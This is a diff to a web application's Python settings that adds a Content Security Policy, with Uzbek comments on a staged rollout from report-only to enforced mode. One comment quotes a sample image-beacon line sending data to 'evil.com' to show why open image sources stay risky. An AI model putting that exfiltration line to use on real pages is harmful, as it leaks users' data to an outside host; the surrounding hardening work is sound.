@@ -185,6 +185,57 @@ FB_CONVERSIONS_API_TOKEN = os.getenv("FB_CONVERSIONS_API_TOKEN")
 # Berilmasa, webhook imzosiz qabul qilinadi (eski xulq) va ogohlantirish chiqadi.
 FB_APP_SECRET = os.getenv("FB_APP_SECRET")
 
+# ========== CONTENT SECURITY POLICY ==========
+# Bosqich 1: tashqi manbalar qat'iy ro'yxatlanadi, lekin 'unsafe-inline'
+# saqlanadi — shablonlarda 139 ta inline event handler (onclick= va h.k.)
+# bor va ularni nonce qamrab olmaydi. Bosqich 2 da handlerlar
+# addEventListener ga ko'chiriladi va nonce joriy qilinadi.
+_CSP_DIRECTIVES = [
+    "default-src 'self'",
+    (
+        "script-src 'self' 'unsafe-inline' "
+        "https://www.googletagmanager.com https://www.google-analytics.com "
+        "https://connect.facebook.net https://telegram.org"
+    ),
+    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com",
+    "font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com",
+    # Post va portfolio rasmlari bazadan keladi va admin istalgan domen
+    # kiritishi mumkin, shuning uchun hozircha barcha HTTPS manbalar ochiq.
+    # S3/R2 yoqilgach bu qator qat'iy ro'yxatga almashtirilsin — aks holda
+    # `new Image().src = 'https://evil.com/?d=' + data` eksfiltratsiya kanali ochiq qoladi.
+    "img-src 'self' data: blob: https:",
+    (
+        "connect-src 'self' "
+        "https://www.google-analytics.com https://region1.google-analytics.com "
+        "https://analytics.google.com https://stats.g.doubleclick.net "
+        "https://www.facebook.com"
+    ),
+    "frame-src 'self' https://www.youtube.com",
+    "media-src 'self' https:",
+    "worker-src 'self'",
+    "manifest-src 'self'",
+    "object-src 'none'",
+    "base-uri 'self'",
+    "form-action 'self'",
+    "frame-ancestors 'self'",
+]
+
+CSP_POLICY = "; ".join(_CSP_DIRECTIVES + ["upgrade-insecure-requests"])
+
+# upgrade-insecure-requests report-only rejimda brauzer tomonidan e'tiborsiz
+# qoldiriladi va konsolga ogohlantirish yozadi — shuning uchun tashlab ketiladi.
+CSP_REPORT_ONLY_POLICY = "; ".join(_CSP_DIRECTIVES)
+
+# Allaqachon jonli ishlayotgan va hech narsani buzmasligi tasdiqlangan minimal to'plam.
+CSP_BASELINE_POLICY = (
+    "object-src 'none'; base-uri 'self'; frame-ancestors 'self'; "
+    "form-action 'self'; upgrade-insecure-requests"
+)
+
+# Yangi siyosat avval kuzatuv rejimida ishlaydi. Konsolda buzilish
+# ko'rinmasa, CSP_ENFORCE=true qo'yib majburiy rejimga o'tkaziladi.
+CSP_ENFORCE = (os.getenv("CSP_ENFORCE", "false") or "").strip().lower() in ("1", "true", "yes", "on")
+
 # ========== PAGINATION ==========
 POSTS_PER_PAGE = 10
 
